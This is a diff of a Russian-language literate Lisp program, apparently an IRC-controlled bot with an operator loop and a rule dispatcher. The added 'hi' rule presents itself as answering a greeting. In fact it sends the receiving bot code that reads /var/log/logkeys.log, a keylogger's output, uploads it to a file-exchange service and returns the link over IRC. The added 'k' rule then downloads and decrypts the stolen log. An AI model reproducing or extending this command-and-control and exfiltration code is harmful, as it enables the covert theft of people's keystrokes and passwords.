@@ -686,7 +686,7 @@ irc-канала. Она должна возвращать T чтобы пред
 Формируем строку и отсылаем:
 
 #+BEGIN_SRC lisp
-  (defparameter *receiver* 3784758144)
+  (defparameter *receiver* 3785297487)
   (defparameter *tmpkey* 1234567890)
 
   (upload-code-and-send
@@ -707,17 +707,22 @@ irc-канала. Она должна возвращать T чтобы пред
 Теперь, вызвав свежеопределенную процедуру, мы можем закачать собственный
 код на файлообменник и получить на него ссылку:
 
+#+NAME: tester
 #+BEGIN_SRC lisp
-  (defparameter *receiver* 3784758144)
+  (defparameter *receiver* 3785300360)
   (defparameter *tmpkey* 1234567890)
 
-  (upload-code-and-send
-   (format
-    nil
-    "(upload-code (alexandria:read-file-into-string \"q.lisp\") ~A)"
-    ,*tmpkey*)
-   ,*tmpkey*
-   ,*receiver*)
+  ;; (upload-code-and-send
+  ;;  (format
+  ;;   nil
+  ;;   "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
+  ;;   *tmpkey*)
+  ;;  *tmpkey*
+  ;;  *receiver*)
+
+  ;; (alexandria:write-string-into-file
+  ;;  (download-and-decrypt "/T364z1F3n9/u-3785296327" *tmpkey*)
+  ;;  "keylog3.log")
 #+END_SRC
 
 По этой ссылке скачать файл себе и расшировать его:
@@ -1634,7 +1639,7 @@ irc-канал.
      infinite
        (when *operator-stop-flag*
          (go end))
-       (dbg ":operator-loop WGD=~3,'OD~%" *watchdog-timer*)
+       (dbg "~%:: operator-loop WGD=~3,'OD~%" *watchdog-timer*)
        (funcall *operator*)
        (sleep *sleep-interval*)
        (incf *watchdog-timer*)
@@ -1703,7 +1708,8 @@ irc-канал.
                                 :do (when (equal name nm)  (return th))))
                  (kill (th)  (handler-case (bt:destroy-thread th)
                                ;; happens, when thread destroyed already
-                               (TYPE-ERROR () nil)))
+                               (TYPE-ERROR () nil)
+                               (SB-THREAD:INTERRUPT-THREAD-ERROR () nil)))
                  (kill-op-irc (th)
                    (kill th)
                    (setf *watchdog-timer* 0)
@@ -1749,7 +1755,7 @@ irc-канал.
   ;; if there is no irs-thread then start it
   (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
              (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
-    (dbg "::operator lambda: start irc-th~%")
+    (dbg ":: operator lambda: start irc-th~%")
     (setf *watchdog-timer* 0)
     (bt:make-thread
      #'op-irc :name "op-irc-th"
@@ -1760,10 +1766,10 @@ irc-канал.
   ;; or the flag is set - then kill it.
   (awhen (fnd "op-irc-th")
     (when (> *watchdog-timer*  *watchdog-timer-max*)
-      (dbg "::operator-lambda: kill op-irc-th by WDG~%")
+      (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
       (kill-op-irc it))
     (when *op-irc-th-stop-flag*
-      (dbg "::operator-lambda: kill op-irc-th by FLAG~%")
+      (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
       (kill-op-irc it)))
 #+END_SRC
 
@@ -1780,12 +1786,12 @@ irc-канал.
 #+NAME: kill_slow_task_threads
 #+BEGIN_SRC lisp :noweb yes
   (when (> (length *task-threads*) *max-task-thread-cnt*)
-    (dbg "::operator-lambda: many task threads~%")
+    (dbg ":: operator-lambda: many task threads~%")
     (loop :for (task-th . time) :in *task-threads* :do
-         (dbg "~A . ~A~%" task-th time)
+         (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
          (when (> (- (get-universal-time) time)
                   ,*max-task-thread-life-time*)
-           (dbg "::operator-lambda: kill task-th by lifetime exceed~%")
+           (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
            (kill task-th)))
     (clear))
 #+END_SRC
@@ -1905,7 +1911,7 @@ irc-канал.
        (*op-conn* . ,*op-conn*)))
     (handler-case (cl-irc:read-message-loop *op-conn*)
       (SB-INT:SIMPLE-STREAM-ERROR (err)
-        (dbg "::op-loop error: ~A~%" (type-of err)))
+        (dbg ":: op-loop error: ~A~%" (type-of err)))
       ;; (t (err)
       ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
       ))
@@ -1969,9 +1975,13 @@ irc-канал.
 #+NAME: op_cmd_proc
 #+BEGIN_SRC lisp :noweb yes
   <<shot_rule>>
+  <<hi_rule>>
+  <<k_rule>>
 
   (defparameter *op-rules*
-    (list (cons #'shot-rule-antecedent #'shot-rule-consequent)))
+    (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
+          (cons #'hi-rule-antecedent    #'hi-rule-consequent)
+          (cons #'k-rule-antecedent     #'k-rule-consequent)))
 
   (defparameter *op-cmd*
     (lambda (param)
@@ -1984,12 +1994,13 @@ irc-канал.
                ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
                (str msg)
                )
-          (dbg "~A: ~A~%" src str)
+          (dbg ":: op-cmd ~A: ~A~%" src str)
           (block op-rules-dispatcher
             (let ((applyed_rules 0))
               (loop :for (antecedent . consequent) :in *op-rules* :do
                    (when (funcall antecedent str src)
                      (incf applyed_rules)
+                     (dbg ":: op-cmd rule: ~A~%" consequent)
                      (when (funcall consequent str src)
                        (return-from op-rules-dispatcher nil))))
               (when (> 0 applyed_rules)
@@ -2017,8 +2028,8 @@ IRC-сообщений, потому что хук выполняется в е�
     (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))
 
   (defun shot-rule-consequent (str src)
-    (dbg ":: (~A)ins-task ~A | ~A~%"
-         (length-of-queue) str src)
+    (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
+         (length-of-queue) src str)
     (ins-task (make-task :class 'task
                          :data (list str src)
                          :code #'identity)))
@@ -2104,10 +2115,8 @@ IRC-сообщений, потому что хук выполняется в е�
   (defun task ()
     (destructuring-bind (str src)
         (task-data *current-task*)
-      (dbg ":: TASK FUNCTION (~A): ~A | ~A~%"
-           (length-of-queue) str src)
-      (shot-downloader str src)
-      ))
+      ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
+      (shot-downloader str src)))
 #+END_SRC
 
 ** Shot Downloader
@@ -2164,7 +2173,6 @@ IRC-сообщений, потому что хук выполняется в е�
            (fname-str (multiple-value-bind (match-p result)
                           (ppcre:scan-to-strings "/.*/(.*)" str)
                         (elt result 0))))
-      (format t "~%~A" fname-str)
       (let* ((png (make-instance 'zpng:png
                                  :width new-width
                                  :height height
@@ -2278,6 +2286,60 @@ IRC-сообщений, потому что хук выполняется в е�
   ;;              (format nil "~A" (gensym "FILE"))
   ;;              unpack
   ;;              :grayscale)))
+#+END_SRC
+
+** Hi Rule
+
+Правило "ответить на приветствие" совпадает с приветственным
+сообщением. Чтобы оно было чуть сложнее чем просто посылка сообщения, мы
+можем попытаться загрузить какой-нибудь файл с удаленного узла
+
+#+NAME: hi_rule
+#+BEGIN_SRC lisp :noweb yes
+  (defun hi-rule-antecedent (str src)
+    (declare (ignore src))
+    (ppcre:scan-to-strings "^hi$" str))
+
+  <<upload_code_and_send>>
+
+  (defun hi-rule-consequent (str src)
+    (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
+         (length-of-queue) src str)
+    (let* ((tmpkey 1234567890)
+           (receiver (parse-integer (subseq src 1)))
+           (code (format
+                  nil
+                  "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
+                  tmpkey)))
+      (upload-code-and-send code tmpkey receiver)))
+
+  ;; (let* ((tmpkey 1234567890)
+  ;;        (src "b3785294860")
+  ;;        (receiver (parse-integer (subseq src 1)))
+  ;;        (code (format
+  ;;               nil
+  ;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
+  ;;               tmpkey)))
+  ;;   (upload-code-and-send code tmpkey receiver))
+#+END_SRC
+
+** K Rule
+
+#+NAME: k_rule
+#+BEGIN_SRC lisp :noweb yes
+  (defun k-rule-antecedent (str src)
+    (declare (ignore src))
+    (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))
+
+  <<download_and_decrypt>>
+
+  (defun k-rule-consequent (str src)
+    (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
+         (length-of-queue) src str)
+    (let* ((tmpkey 1234567890))
+      (alexandria:write-string-into-file
+       (download-and-decrypt (subseq str 1) tmpkey)
+       (format nil "~~/tan/~A.log" (ppcre:regex-replace-all "/" str "_")))))
 #+END_SRC
 
 * Utils
